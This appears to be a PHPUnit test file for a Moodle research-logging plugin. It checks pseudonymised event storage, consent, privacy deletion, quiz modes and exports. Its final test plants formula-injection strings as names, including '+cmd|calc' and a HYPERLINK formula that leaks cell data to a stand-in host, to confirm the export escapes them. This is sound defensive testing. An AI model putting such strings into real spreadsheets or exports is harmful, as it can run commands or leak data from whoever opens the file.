<?php
// This file is part of Moodle - http://moodle.org/
//
// Moodle is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.

/**
 * tests research logger test.php for Hand2STACK.
 *
 * @package    local_hand2stack
 * @copyright  2026 Phoebe Huang
 * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
 */
namespace local_hand2stack;

use local_hand2stack\local\input_mode;
use local_hand2stack\local\research_cleanup;
use local_hand2stack\local\research_export;
use local_hand2stack\local\research_logger;
use local_hand2stack\local\research_finisher;
use local_hand2stack\local\research_integrity;

defined('MOODLE_INTERNAL') || die();

global $CFG;
require_once($CFG->dirroot . '/question/engine/lib.php');
require_once($CFG->dirroot . '/mod/quiz/locallib.php');

/**
 * @covers \local_hand2stack\local\research_logger
 * @covers \local_hand2stack\local\input_mode
 * @covers \local_hand2stack\local\research_export
 * @covers \local_hand2stack\local\research_cleanup
 * @covers \local_hand2stack\privacy\provider
 */
final class research_logger_test extends \advanced_testcase {
    private function enable_study(string $studyid = 'pilot2026a'): void {
        set_config('enabled', 1, 'local_hand2stack');
        set_config('researchlogging', 1, 'local_hand2stack');
        set_config('researchstudyid', $studyid, 'local_hand2stack');
    }

    /** A started question preview owned by the user, as [usageid, slot]. */
    private function create_preview_usage(\stdClass $user): array {
        $questiongenerator = $this->getDataGenerator()->get_plugin_generator('core_question');
        $category = $questiongenerator->create_question_category();
        $question = $questiongenerator->create_question('shortanswer', null, ['category' => $category->id]);

        $quba = \question_engine::make_questions_usage_by_activity('core_question_preview',
            \context_user::instance($user->id));
        $quba->set_preferred_behaviour('deferredfeedback');
        $slot = $quba->add_question(\question_bank::load_question($question->id));
        $quba->start_all_questions();
        \question_engine::save_questions_usage_by_activity($quba);
        return [(int)$quba->get_id(), (int)$slot];
    }

    /** A quiz in the given input mode and the user's started attempt, as [quiz, usageid, slot]. */
    private function create_quiz_attempt(\stdClass $user, string $mode, array $names = [],
            array $settings = []): array {
        $course = $this->getDataGenerator()->create_course(array_filter(['shortname' => $names['course'] ?? null]));
        $quiz = $this->getDataGenerator()->create_module('quiz',
            ['course' => $course->id] + array_filter(['name' => $names['quiz'] ?? null]) + $settings);
        input_mode::set_for_cm((int)$quiz->cmid, $mode);

        $questiongenerator = $this->getDataGenerator()->get_plugin_generator('core_question');
        $category = $questiongenerator->create_question_category();
        $question = $questiongenerator->create_question('shortanswer', null,
            ['category' => $category->id] + array_filter(['name' => $names['question'] ?? null]));
        quiz_add_quiz_question($question->id, $quiz);
        \mod_quiz\quiz_settings::create($quiz->id)->get_grade_calculator()->recompute_quiz_sumgrades();

        $this->setUser($user);
        $attempt = quiz_prepare_and_start_new_attempt(\mod_quiz\quiz_settings::create($quiz->id, $user->id), 1, null);
        $this->setUser(null);
        return [$quiz, (int)$attempt->uniqueid, 1];
    }

    private function make_participant(\stdClass $user): void {
        $roleid = create_role('Research participant', 'h2sparticipant', '');
        $systemcontext = \context_system::instance();
        assign_capability(research_logger::PARTICIPANT_CAPABILITY, CAP_ALLOW, $roleid, $systemcontext->id);
        role_assign($roleid, $user->id, $systemcontext->id);
    }

    private function event(int $usageid, int $slot, array $overrides = []): array {
        static $seq = 0;
        $seq++;
        return array_merge([
            'eventid' => sprintf('00000000-0000-4000-8000-%012d', $seq),
            'traceid' => '11111111-1111-4111-8111-111111111111',
            'pageid' => '22222222-2222-4222-8222-222222222222',
            'eventseq' => $seq,
            'type' => 'edit_committed',
            'clienttime' => 1791190809123,
            'elapsedms' => 8123,
            'usage' => $usageid,
            'slot' => $slot,
            'input' => 'ans1',
            'modality' => 'image',
            'schema' => 1,
            'payload' => ['target' => 'line', 'before' => 'x^2+5x+8=0', 'after' => 'x^2+5x+6=0'],
        ], $overrides);
    }

    public function test_pseudonym_is_stable_within_a_study_and_differs_across_studies(): void {
        $this->resetAfterTest();

        $first = research_logger::anon_user_id(42, 'pilot2026a');
        $this->assertSame($first, research_logger::anon_user_id(42, 'pilot2026a'));
        $this->assertNotSame($first, research_logger::anon_user_id(42, 'controlled2027a'));
        $this->assertNotSame($first, research_logger::anon_user_id(43, 'pilot2026a'));
        $this->assertMatchesRegularExpression('/^[0-9a-f]{64}$/', $first);
    }

    public function test_normalise_event_rejects_unknown_types_and_malformed_ids(): void {
        $this->assertNotNull(research_logger::normalise_event($this->event(1, 1)));
        foreach (['task_started', 'submit_confirmed', 'task_finished'] as $type) {
            $this->assertNotNull(research_logger::normalise_event($this->event(1, 1, ['type' => $type])));
        }
        $this->assertNull(research_logger::normalise_event($this->event(1, 1, ['type' => 'keypress'])));
        $this->assertNull(research_logger::normalise_event($this->event(1, 1, ['eventid' => 'not-a-uuid'])));
        $this->assertNull(research_logger::normalise_event($this->event(1, 1, ['schema' => 99])));
        $this->assertNull(research_logger::normalise_event($this->event(1, 1, ['payload' => 'text'])));

        $record = research_logger::normalise_event($this->event(1, 1, ['modality' => 'telepathy', 'payload' => []]));
        $this->assertNull($record->modality);
        $this->assertSame('{}', $record->payload);
    }

    public function test_events_are_stored_with_server_resolved_identity_and_no_user_id(): void {
        global $DB;
        $this->resetAfterTest();
        $this->enable_study();

        $user = $this->getDataGenerator()->create_user();
        $this->make_participant($user);
        [$usageid, $slot] = $this->create_preview_usage($user);

        $event = $this->event($usageid, $slot);
        $counts = research_logger::record_batch([$event, $event], (int)$user->id);
        $this->assertSame(['accepted' => 1, 'duplicates' => 1, 'rejected' => 0,
            'acknowledgedIds' => [$event['eventid'], $event['eventid']], 'rejectedIds' => []], $counts);

        $record = $DB->get_record('local_hand2stack_event', ['eventid' => $event['eventid']], '*', MUST_EXIST);
        $this->assertSame('pilot2026a', $record->studyid);
        $this->assertSame(research_logger::anon_user_id((int)$user->id, 'pilot2026a'), $record->anonuserid);
        $this->assertNotEmpty($record->questionid);
        $this->assertNotEmpty($record->qbankentryid);
        $this->assertNotEmpty($record->pluginversion);
        $this->assertSame(['target' => 'line', 'before' => 'x^2+5x+8=0', 'after' => 'x^2+5x+6=0'],
            json_decode($record->payload, true));
        // A question preview is never identified.
        $this->assertNull($record->userid);
        $this->assertSame(0, (int)$record->identified);
    }

    public function test_non_participants_and_other_users_usages_are_not_recorded(): void {
        global $DB;
        $this->resetAfterTest();
        $this->enable_study();

        $owner = $this->getDataGenerator()->create_user();
        $other = $this->getDataGenerator()->create_user();
        [$usageid, $slot] = $this->create_preview_usage($owner);

        // Owner without consent.
        $this->assertSame(1, research_logger::record_batch([$this->event($usageid, $slot)], (int)$owner->id)['rejected']);

        // A consenting participant cannot log into someone else's usage.
        $this->make_participant($other);
        $this->assertSame(1, research_logger::record_batch([$this->event($usageid, $slot)], (int)$other->id)['rejected']);

        // An unknown slot is rejected.
        $unknown = $this->event($usageid, 99);
        $counts = research_logger::record_batch([$unknown], (int)$other->id);
        $this->assertSame(1, $counts['rejected']);
        // The page is told to stop sending it, and that nothing was stored.
        $this->assertSame([$unknown['eventid']], $counts['rejectedIds']);
        $this->assertSame([], $counts['acknowledgedIds']);

        $this->assertSame(0, $DB->count_records('local_hand2stack_event'));
    }

    public function test_privacy_api_finds_and_deletes_events_by_pseudonym(): void {
        global $DB;
        $this->resetAfterTest();
        $this->enable_study();

        $user = $this->getDataGenerator()->create_user();
        $this->make_participant($user);
        [$usageid, $slot] = $this->create_preview_usage($user);
        research_logger::record_batch([$this->event($usageid, $slot)], (int)$user->id);

        $contextlist = privacy\provider::get_contexts_for_userid((int)$user->id);
        $this->assertCount(1, $contextlist);

        $approved = new \core_privacy\local\request\approved_contextlist($user, 'local_hand2stack',
            $contextlist->get_contextids());
        privacy\provider::delete_data_for_user($approved);
        $this->assertSame(0, $DB->count_records('local_hand2stack_event'));
    }

    public function test_privacy_userlist_finds_event_owners_through_their_usage(): void {
        global $DB;
        $this->resetAfterTest();
        $this->enable_study();

        $user = $this->getDataGenerator()->create_user();
        $this->make_participant($user);
        [$usageid, $slot] = $this->create_preview_usage($user);
        research_logger::record_batch([$this->event($usageid, $slot)], (int)$user->id);

        $context = \context_system::instance();
        $userlist = new \core_privacy\local\request\userlist($context, 'local_hand2stack');
        privacy\provider::get_users_in_context($userlist);
        $this->assertSame([(int)$user->id], array_map('intval', $userlist->get_userids()));

        privacy\provider::delete_data_for_users(new \core_privacy\local\request\approved_userlist(
            $context, 'local_hand2stack', [(int)$user->id]));
        $this->assertSame(0, $DB->count_records('local_hand2stack_event'));
    }

    public function test_events_carry_the_condition_of_the_quiz_they_were_made_in(): void {
        global $DB;
        $this->resetAfterTest();
        $this->enable_study();

        $user = $this->getDataGenerator()->create_user();
        $this->make_participant($user);
        [, $handusage, $slot] = $this->create_quiz_attempt($user, input_mode::NORMAL);
        [$keyboardquiz, $keyboardusage] = $this->create_quiz_attempt($user, input_mode::LOGONLY);
        [, $offusage] = $this->create_quiz_attempt($user, input_mode::OFF);
        [$previewusage, $previewslot] = $this->create_preview_usage($user);

        $hand = $this->event($handusage, $slot);
        $keyboard = $this->event($keyboardusage, $slot, ['modality' => 'keyboard']);
        $preview = $this->event($previewusage, $previewslot);
        $off = $this->event($offusage, $slot);
        $counts = research_logger::record_batch([$hand, $keyboard, $preview, $off], (int)$user->id);
        $this->assertSame(['accepted' => 3, 'duplicates' => 0, 'rejected' => 1,
            'acknowledgedIds' => [$hand['eventid'], $keyboard['eventid'], $preview['eventid']],
            'rejectedIds' => [$off['eventid']]], $counts);

        $condition = fn(array $event) => $DB->get_field('local_hand2stack_event', 'studycondition',
            ['eventid' => $event['eventid']], MUST_EXIST);
        $this->assertSame('hand2stack', $condition($hand));
        $this->assertSame('keyboard', $condition($keyboard));
        $this->assertNull($condition($preview));

        // Changing the mode later never relabels events already recorded.
        input_mode::set_for_cm((int)$keyboardquiz->cmid, input_mode::NORMAL);
        $this->assertSame('keyboard', $condition($keyboard));
    }

    public function test_input_mode_defaults_to_normal_and_locks_once_attempted(): void {
        global $DB;
        $this->resetAfterTest();

        $course = $this->getDataGenerator()->create_course();
        $quiz = $this->getDataGenerator()->create_module('quiz', ['course' => $course->id]);
        $this->assertSame(input_mode::NORMAL, input_mode::for_cm((int)$quiz->cmid));
        $this->assertFalse(input_mode::is_locked((int)$quiz->id));

        // Saving normal on a quiz without a row stores nothing.
        input_mode::set_for_cm((int)$quiz->cmid, input_mode::NORMAL);
        $this->assertSame(0, $DB->count_records('local_hand2stack_cm'));
        input_mode::set_for_cm((int)$quiz->cmid, input_mode::LOGONLY);
        $this->assertSame(input_mode::LOGONLY, input_mode::for_cm((int)$quiz->cmid));
        $this->assertSame(input_mode::LOGONLY,
            input_mode::for_context(\context_module::instance((int)$quiz->cmid)));
        $this->assertSame(input_mode::NORMAL, input_mode::for_context(\context_system::instance()));

        [$attempted] = $this->create_quiz_attempt($this->getDataGenerator()->create_user(), input_mode::LOGONLY);
        $this->assertTrue(input_mode::is_locked((int)$attempted->id));

        course_delete_module((int)$quiz->cmid);
        $this->assertFalse($DB->record_exists('local_hand2stack_cm', ['cmid' => $quiz->cmid]));
    }

    public function test_export_of_a_quiz_is_pseudonymised_and_carries_condition_and_final_mark(): void {
        $this->resetAfterTest();
        $this->enable_study();

        $user = $this->getDataGenerator()->create_user();
        $this->make_participant($user);
        [$quiz, $usageid, $slot] = $this->create_quiz_attempt($user, input_mode::LOGONLY);
        [, $otherusage] = $this->create_quiz_attempt($user, input_mode::NORMAL);
        [$previewusage, $previewslot] = $this->create_preview_usage($user);
        research_logger::record_batch([
            $this->event($usageid, $slot, ['modality' => 'keyboard']),
            $this->event($otherusage, $slot),
            $this->event($previewusage, $previewslot),
        ], (int)$user->id);

        // The learner answers correctly and submits; the export shows the final mark.
        $this->setUser($user);
        $attemptobj = \mod_quiz\quiz_attempt::create_from_usage_id($usageid);
        $attemptobj->process_submitted_actions(time(), false, [$slot => ['answer' => 'frog']]);
        $attemptobj->process_finish(time(), false);
        $this->setUser(null);

        $this->assertSame(['pilot2026a'], research_export::study_ids((int)$quiz->cmid));
        $this->assertSame(1, research_export::count('pilot2026a', (int)$quiz->cmid));
        $this->assertSame(3, research_export::count('pilot2026a'));

        $records = research_export::recordset('pilot2026a', (int)$quiz->cmid);
        $rows = [];
        foreach ($records as $record) {
            $rows[] = array_combine(research_export::COLUMNS, research_export::row($record));
        }
        $records->close();

        $this->assertCount(1, $rows);
        $row = $rows[0];
        $this->assertSame('keyboard', $row['studycondition']);
        $this->assertSame((int)$quiz->cmid, (int)$row['cmid']);
        $this->assertSame(research_logger::anon_attempt_id($usageid, 'pilot2026a'), $row['anonattemptid']);
        $this->assertSame(research_logger::anon_user_id((int)$user->id, 'pilot2026a'), $row['anonuserid']);
        $this->assertSame('gradedright', $row['finalstate']);
        $this->assertEqualsWithDelta(1.0, $row['finalfraction'], 1e-7);
        $this->assertEqualsWithDelta((float)$row['maxmark'], $row['finalmark'], 1e-7);
        $this->assertMatchesRegularExpression('/^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d\.\d{3}Z$/', $row['clienttimeiso']);
        // Nothing in the file leads back to the learner.
        foreach (['usageid', 'firstname', 'lastname', 'email'] as $column) {
            $this->assertNotContains($column, research_export::COLUMNS);
        }
        $this->assertSame(0, $row['identified']);
        foreach (['userid', 'username', 'idnumber', 'fullname'] as $column) {
            $this->assertNull($row[$column]);
        }
        $this->assertNotContains((string)$usageid, [(string)$row['anonattemptid']]);
    }

    public function test_export_rows_carry_the_round_graded_again_from_each_check(): void {
        global $DB;
        $this->resetAfterTest();
        $this->enable_study();

        $user = $this->getDataGenerator()->create_user();
        $this->make_participant($user);
        [$quiz, $usageid, $slot] = $this->create_quiz_attempt($user, input_mode::NORMAL, [],
            ['preferredbehaviour' => 'interactive']);
        $start = (int)$DB->get_field_sql("SELECT MIN(s.timecreated)
                                            FROM {question_attempt_steps} s
                                            JOIN {question_attempts} qa ON qa.id = s.questionattemptid
                                           WHERE qa.questionusageid = ?", [$usageid]);

        // A partly right Check that leaves tries, Try again, then the right answer.
        $this->setUser($user);
        $attemptobj = \mod_quiz\quiz_attempt::create_from_usage_id($usageid);
        $attemptobj->process_submitted_actions($start + 10, false, [$slot => ['answer' => 'toad', '-submit' => 1]]);
        $attemptobj = \mod_quiz\quiz_attempt::create_from_usage_id($usageid);
        $attemptobj->process_submitted_actions($start + 20, false, [$slot => ['-tryagain' => 1]]);
        $attemptobj = \mod_quiz\quiz_attempt::create_from_usage_id($usageid);
        $attemptobj->process_submitted_actions($start + 30, false, [$slot => ['answer' => 'frog', '-submit' => 1]]);
        $this->setUser(null);

        // Interactive mode keeps no fraction for the first Check, only its tries.
        $steps = array_values($DB->get_records_sql("SELECT s.sequencenumber, s.state, s.fraction
                                                      FROM {question_attempt_steps} s
                                                      JOIN {question_attempts} qa ON qa.id = s.questionattemptid
                                                     WHERE qa.questionusageid = ? AND qa.slot = ?
                                                  ORDER BY s.sequencenumber", [$usageid, $slot]));
        $this->assertSame(['todo', 'todo', 'todo', 'gradedright'], array_column($steps, 'state'));
        $this->assertNull($steps[1]->fraction);

        // The learner's browser clock is 100 s slow. Each event is [type, when it happened, when the
        // server received its batch], in ms after the attempt started. The revision and the second
        // Check's submit_triggered only arrive with the batch after it, 31.5 s in; the submit_triggered
        // happened in the same second as the Check's step, just before it.
        $happened = [
            ['task_started', 1000, 1300],
            ['feedback_observed', 11000, 11300],
            ['revision_started', 25000, 31500],
            ['submit_triggered', 30200, 31500],
            ['feedback_observed', 31200, 31500],
        ];
        $events = [];
        foreach ($happened as [$type, $at]) {
            $events[] = $this->event($usageid, $slot, ['type' => $type, 'input' => null, 'payload' => [],
                'clienttime' => $start * 1000 + $at - 100000]);
        }
        research_logger::record_batch($events, (int)$user->id);
        foreach ($happened as $index => [, , $received]) {
            $DB->set_field('local_hand2stack_event', 'servertime', $start * 1000 + $received,
                ['eventid' => $events[$index]['eventid']]);
        }

        $records = research_export::recordset('pilot2026a', (int)$quiz->cmid);
        $rows = [];
        foreach ($records as $record) {
            $row = array_combine(research_export::COLUMNS, research_export::row($record));
            $rows[] = [$row['eventtype'], $row['stepseq'], $row['stepstate'], $row['steptriesleft'],
                $row['steprawfraction'], $row['finalstate']];
        }
        $records->close();

        // Dated by its batch's arrival, the revision and the submit_triggered would show the second
        // Check's step; on the corrected clock they show the round they happened in.
        $this->assertSame([
            ['task_started', 0, 'todo', $rows[0][3], null, 'gradedright'],
            ['feedback_observed', 1, 'todo', $rows[0][3] - 1, 0.8, 'gradedright'],
            ['revision_started', 2, 'todo', $rows[0][3] - 1, 0.8, 'gradedright'],
            ['submit_triggered', 2, 'todo', $rows[0][3] - 1, 0.8, 'gradedright'],
            ['feedback_observed', 3, 'gradedright', $rows[0][3] - 1, 1.0, 'gradedright'],
        ], $rows);
        $this->assertGreaterThan(1, $rows[0][3]);
    }

    public function test_deleting_a_quiz_attempt_deletes_its_events_and_only_its_events(): void {
        global $DB;
        $this->resetAfterTest();
        $this->enable_study();

        $user = $this->getDataGenerator()->create_user();
        $this->make_participant($user);
        [$quiz, $usageid, $slot] = $this->create_quiz_attempt($user, input_mode::NORMAL);
        [, $otherusage] = $this->create_quiz_attempt($user, input_mode::NORMAL);
        research_logger::record_batch([
            $this->event($usageid, $slot),
            $this->event($usageid, $slot, ['type' => 'submit_triggered']),
            $this->event($otherusage, $slot),
        ], (int)$user->id);

        // As the quiz report's "Delete selected attempts" does.
        $attempt = $DB->get_record('quiz_attempts', ['uniqueid' => $usageid]);
        quiz_delete_attempt($attempt, $DB->get_record('quiz', ['id' => $quiz->id]));

        $this->assertSame(0, $DB->count_records('local_hand2stack_event', ['usageid' => $usageid]));
        $this->assertSame(1, $DB->count_records('local_hand2stack_event', ['usageid' => $otherusage]));
        // A page still open on the deleted attempt cannot bring its events back.
        $result = research_logger::record_batch([$this->event($usageid, $slot)], (int)$user->id);
        $this->assertSame(1, $result['rejected']);
        $this->assertSame(0, $DB->count_records('local_hand2stack_event', ['usageid' => $usageid]));
    }

    public function test_the_hourly_cleanup_deletes_events_of_usages_deleted_without_a_notice(): void {
        global $DB;
        $this->resetAfterTest();
        $this->enable_study();

        $user = $this->getDataGenerator()->create_user();
        $this->make_participant($user);
        [$previewusage, $previewslot] = $this->create_preview_usage($user);
        [, $quizusage, $slot] = $this->create_quiz_attempt($user, input_mode::NORMAL);
        research_logger::record_batch([
            $this->event($previewusage, $previewslot),
            $this->event($quizusage, $slot),
        ], (int)$user->id);

        // A question preview is cleaned up by Moodle with no event or hook.
        \question_engine::delete_questions_usage_by_activity($previewusage);
        $this->assertSame(1, $DB->count_records('local_hand2stack_event', ['usageid' => $previewusage]));

        ob_start();
        (new \local_hand2stack\task\cleanup_sessions())->execute();
        $output = ob_get_clean();

        $this->assertStringContainsString('Deleted 1 research events', $output);
        $this->assertSame(0, $DB->count_records('local_hand2stack_event', ['usageid' => $previewusage]));
        $this->assertSame(1, $DB->count_records('local_hand2stack_event', ['usageid' => $quizusage]));
        // Nothing left over: the next run deletes nothing.
        $this->assertSame(0, research_cleanup::delete_orphaned_events());
    }

    public function test_an_identified_quiz_keeps_the_user_id_and_exports_who_it_was(): void {
        global $DB;
        $this->resetAfterTest();
        $this->enable_study();

        $user = $this->getDataGenerator()->create_user(
            ['username' => 'taro', 'idnumber' => 'S1234', 'firstname' => 'Taro', 'lastname' => 'Yamada']);
        $this->make_participant($user);
        [$quiz, $usageid, $slot] = $this->create_quiz_attempt($user, input_mode::NORMAL);
        input_mode::set_identified_for_cm((int)$quiz->cmid, true);
        [$studyquiz, $studyusage] = $this->create_quiz_attempt($user, input_mode::NORMAL);
        $this->assertTrue(input_mode::identified_for_cm((int)$quiz->cmid));
        $this->assertFalse(input_mode::identified_for_cm((int)$studyquiz->cmid));

        $identified = $this->event($usageid, $slot);
        $pseudonymous = $this->event($studyusage, $slot);
        research_logger::record_batch([$identified, $pseudonymous], (int)$user->id);

        $stored = $DB->get_record('local_hand2stack_event', ['eventid' => $identified['eventid']], '*', MUST_EXIST);
        $this->assertSame((int)$user->id, (int)$stored->userid);
        $this->assertSame(1, (int)$stored->identified);
        $this->assertSame(research_logger::anon_user_id((int)$user->id, 'pilot2026a'), $stored->anonuserid);
        $stored = $DB->get_record('local_hand2stack_event', ['eventid' => $pseudonymous['eventid']], '*', MUST_EXIST);
        $this->assertNull($stored->userid);
        $this->assertSame(0, (int)$stored->identified);

        $records = research_export::recordset('pilot2026a', (int)$quiz->cmid);
        $rows = [];
        foreach ($records as $record) {
            $rows[] = array_combine(research_export::COLUMNS, research_export::row($record));
        }
        $records->close();
        $this->assertCount(1, $rows);
        $this->assertSame(1, $rows[0]['identified']);
        $this->assertSame((int)$user->id, $rows[0]['userid']);
        $this->assertSame('taro', $rows[0]['username']);
        $this->assertSame('S1234', $rows[0]['idnumber']);
        $this->assertSame(fullname($user), $rows[0]['fullname']);

        // The privacy API finds and deletes both kinds of event.
        $contextlist = privacy\provider::get_contexts_for_userid((int)$user->id);
        $userlist = new \core_privacy\local\request\userlist(\context_system::instance(), 'local_hand2stack');
        privacy\provider::get_users_in_context($userlist);
        $this->assertSame([(int)$user->id], array_values(array_unique(array_map('intval', $userlist->get_userids()))));
        privacy\provider::delete_data_for_user(new \core_privacy\local\request\approved_contextlist($user,
            'local_hand2stack', $contextlist->get_contextids()));
        $this->assertSame(0, $DB->count_records('local_hand2stack_event'));

        // Like the input mode, the setting is kept on a quiz row and removed with the quiz.
        input_mode::set_identified_for_cm((int)$quiz->cmid, false);
        $this->assertFalse(input_mode::identified_for_cm((int)$quiz->cmid));
        $this->assertSame(input_mode::NORMAL, input_mode::for_cm((int)$quiz->cmid));
    }

    public function test_the_server_ends_the_traces_a_finished_attempt_left_open(): void {
        global $DB;
        $this->resetAfterTest();
        $this->enable_study();

        $user = $this->getDataGenerator()->create_user();
        $this->make_participant($user);
        // Two questions on two pages.
        $course = $this->getDataGenerator()->create_course();
        $quiz = $this->getDataGenerator()->create_module('quiz', ['course' => $course->id]);
        $questiongenerator = $this->getDataGenerator()->get_plugin_generator('core_question');
        $category = $questiongenerator->create_question_category();
        foreach ([1, 2] as $page) {
            $question = $questiongenerator->create_question('shortanswer', null, ['category' => $category->id]);
            quiz_add_quiz_question($question->id, $quiz, $page);
        }
        \mod_quiz\quiz_settings::create($quiz->id)->get_grade_calculator()->recompute_quiz_sumgrades();
        $this->setUser($user);
        $attempt = quiz_prepare_and_start_new_attempt(\mod_quiz\quiz_settings::create($quiz->id, $user->id), 1, null);
        $this->setUser(null);
        $usageid = (int)$attempt->uniqueid;

        $trace = fn(int $n) => sprintf('%08d-1111-4111-8111-111111111111', $n);
        // Slot 1 was finished by the browser; slot 2 was left on an earlier page.
        research_logger::record_batch([
            $this->event($usageid, 1, ['traceid' => $trace(1), 'type' => 'task_started', 'eventseq' => 1]),
            $this->event($usageid, 1, ['traceid' => $trace(1), 'type' => 'task_finished', 'eventseq' => 2]),
            $this->event($usageid, 2, ['traceid' => $trace(2), 'type' => 'task_started', 'eventseq' => 1]),
            $this->event($usageid, 2, ['traceid' => $trace(2), 'type' => 'submit_triggered', 'eventseq' => 2]),
        ], (int)$user->id);

        // Submitting queues the task, a few minutes later.
        $this->setUser($user);
        $attemptobj = \mod_quiz\quiz_attempt::create_from_usage_id($usageid);
        $attemptobj->process_finish(time(), false);
        $this->setUser(null);
        $tasks = \core\task\manager::get_adhoc_tasks('\\local_hand2stack\\task\\complete_research_traces');
        $this->assertCount(1, $tasks);
        $task = reset($tasks);
        $this->assertGreaterThan(time() + research_finisher::DELAY_SECONDS - 60, $task->get_next_run_time());

        $this->assertSame(1, research_finisher::complete_attempt((int)$attempt->id, research_finisher::REASON_SUBMITTED));
        // Running again adds nothing.
        $this->assertSame(0, research_finisher::complete_attempt((int)$attempt->id, research_finisher::REASON_SUBMITTED));

        $this->assertSame(1, $DB->count_records('local_hand2stack_event', ['traceid' => $trace(1), 'eventtype' => 'task_finished']));
        $added = $DB->get_record('local_hand2stack_event', ['traceid' => $trace(2), 'eventtype' => 'task_finished'],
            '*', MUST_EXIST);
        $this->assertSame(3, (int)$added->eventseq);
        $this->assertSame('hand2stack', $added->studycondition);
        $this->assertSame(research_logger::anon_user_id((int)$user->id, 'pilot2026a'), $added->anonuserid);
        $payload = json_decode($added->payload, true);
        $this->assertSame(research_finisher::REASON_SUBMITTED, $payload['reason']);
        $this->assertSame('server', $payload['source']);
        $this->assertSame('gaveup', $payload['moodleState']);

        // The browser's own task_finished arriving late takes the server's place:
        // it has the active time and the final answers, and keeps what the server saw.
        $late = $this->event($usageid, 2, ['traceid' => $trace(2), 'type' => 'task_finished', 'eventseq' => 3,
            'payload' => ['reason' => 'quiz_finished', 'activeTimeMs' => 42000]]);
        $counts = research_logger::record_batch([$late], (int)$user->id);
        $this->assertSame(1, $counts['accepted']);
        $this->assertSame([$late['eventid']], $counts['acknowledgedIds']);
        $finished = $DB->get_records('local_hand2stack_event', ['traceid' => $trace(2), 'eventtype' => 'task_finished']);
        $this->assertCount(1, $finished);
        $finished = reset($finished);
        $this->assertSame($late['eventid'], $finished->eventid);
        $this->assertFalse(research_logger::is_server_event($finished));
        $payload = json_decode($finished->payload, true);
        $this->assertSame(42000, $payload['activeTimeMs']);
        $this->assertSame(['reason' => research_finisher::REASON_SUBMITTED, 'moodleState' => 'gaveup'],
            $payload['serverFinish']);

        // A second task_finished from a browser is still only a duplicate, and the server adds none.
        $again = $this->event($usageid, 2, ['traceid' => $trace(2), 'type' => 'task_finished', 'eventseq' => 4]);
        $counts = research_logger::record_batch([$again], (int)$user->id);
        $this->assertSame(1, $counts['duplicates']);
        $this->assertSame([$again['eventid']], $counts['acknowledgedIds']);
        $this->assertSame(1, $DB->count_records('local_hand2stack_event', ['traceid' => $trace(2), 'eventtype' => 'task_finished']));
        $this->assertSame(0, research_finisher::complete_attempt((int)$attempt->id, research_finisher::REASON_SUBMITTED));

        // A browser cannot pass its own event off as the server's.
        $forged = $this->event($usageid, 1, ['traceid' => $trace(1), 'payload' => ['source' => 'server']]);
        $counts = research_logger::record_batch([$forged], (int)$user->id);
        $this->assertSame(1, $counts['rejected']);
        $this->assertSame([$forged['eventid']], $counts['rejectedIds']);

        // Both paths end a question under one lock, and neither leaves it held.
        $factory = \core\lock\lock_config::get_lock_factory('local_hand2stack_finish');
        foreach ([1, 2] as $slot) {
            $lock = $factory->get_lock($usageid . '_' . $slot, 0);
            $this->assertNotFalse($lock);
            $lock->release();
        }
        $this->assertSame(1, research_logger::with_finish_lock($usageid, 2, fn() => 1));

        // The integrity check sees a finished trace, without a duplicate number.
        $summaries = research_integrity::check('pilot2026a', (int)$quiz->cmid);
        $summary = array_values(array_filter($summaries, fn($t) => $t['traceid'] === $trace(2)))[0];
        $this->assertNotNull($summary['finished']);
        $this->assertSame(0, $summary['duplicateseqs']);
    }

    public function test_only_teachers_and_managers_may_download_a_quiz_log(): void {
        $this->resetAfterTest();

        $course = $this->getDataGenerator()->create_course();
        $quiz = $this->getDataGenerator()->create_module('quiz', ['course' => $course->id]);
        $context = \context_module::instance((int)$quiz->cmid);
        $teacher = $this->getDataGenerator()->create_and_enrol($course, 'editingteacher');
        $assistant = $this->getDataGenerator()->create_and_enrol($course, 'teacher');
        $student = $this->getDataGenerator()->create_and_enrol($course, 'student');

        $this->assertTrue(has_capability('local/hand2stack:exportlogs', $context, $teacher));
        $this->assertFalse(has_capability('local/hand2stack:exportlogs', $context, $assistant));
        $this->assertFalse(has_capability('local/hand2stack:exportlogs', $context, $student));
        // A teacher here has no right in another course.
        $othercourse = $this->getDataGenerator()->create_course();
        $otherquiz = $this->getDataGenerator()->create_module('quiz', ['course' => $othercourse->id]);
        $this->assertFalse(has_capability('local/hand2stack:exportlogs',
            \context_module::instance((int)$otherquiz->cmid), $teacher));
    }

    public function test_spreadsheet_exports_never_turn_names_into_formulas(): void {
        $this->resetAfterTest();
        $this->enable_study();

        $user = $this->getDataGenerator()->create_user();
        $this->make_participant($user);
        $names = [
            'course' => '+cmd|calc',
            'quiz' => '=HYPERLINK("https://example.invalid/?leak="&A1,"Open")',
            'question' => '@SUM(1+1)',
        ];
        [$quiz, $usageid, $slot] = $this->create_quiz_attempt($user, input_mode::NORMAL, $names);
        research_logger::record_batch([$this->event($usageid, $slot)], (int)$user->id);

        $rowfor = function(bool $spreadsheet) use ($quiz): array {
            $records = research_export::recordset('pilot2026a', (int)$quiz->cmid);
            $rows = [];
            foreach ($records as $record) {
                $rows[] = array_combine(research_export::COLUMNS, research_export::row($record, $spreadsheet));
            }
            $records->close();
            $this->assertCount(1, $rows);
            return $rows[0];
        };

        $row = $rowfor(true);
        $this->assertSame("'" . $names['course'], $row['course']);
        $this->assertSame("'" . $names['quiz'], $row['quiz']);
        $this->assertSame("'" . $names['question'], $row['question']);
        // Ordinary values are untouched, and numbers stay numbers.
        $this->assertSame('edit_committed', $row['eventtype']);
        $this->assertStringStartsWith('{', $row['payload']);
        $this->assertNull($row['finalfraction']);

        // JSON and HTML downloads keep the names exactly as written.
        $raw = $rowfor(false);
        $this->assertSame($names['quiz'], $raw['quiz']);
        $this->assertSame($names['course'], $raw['course']);

        // Through Moodle's own CSV writer the prefix is applied once, not twice.
        $records = research_export::recordset('pilot2026a', (int)$quiz->cmid);
        $path = \core\dataformat::write_data('h2s-formula', 'csv', research_export::COLUMNS, $records,
            fn(\stdClass $record) => research_export::row($record, true));
        $records->close();
        $csv = file_get_contents($path);
        $this->assertStringContainsString("'=HYPERLINK(", $csv);
        $this->assertStringNotContainsString("''=HYPERLINK(", $csv);
        $this->assertStringContainsString("'@SUM(1+1)", $csv);
        $this->assertStringNotContainsString(',=HYPERLINK(', $csv);
        $this->assertStringNotContainsString(',"=HYPERLINK(', $csv);
    }

